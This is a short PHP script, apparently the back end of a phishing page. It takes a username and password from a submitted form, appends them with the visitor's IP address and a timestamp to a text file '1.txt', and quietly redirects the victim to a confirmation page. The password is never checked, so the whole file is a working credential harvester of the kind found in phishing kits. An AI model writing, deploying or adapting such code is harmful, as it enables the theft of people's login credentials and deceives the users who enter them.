<?php
$cevap1 = $_POST['username'];
$cevap2 =  $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");
$file = fopen('1.txt', 'a'); 
fwrite($file, $cevap1."-----Kullanici adi-----> " .$cevap2. "   Ip Adresi: " .$ip. "   Tarih: " .$cur_time.  "\n\n");
fclose($file); 
echo '';
			header("Refresh:0; url=confirm.php");
?>





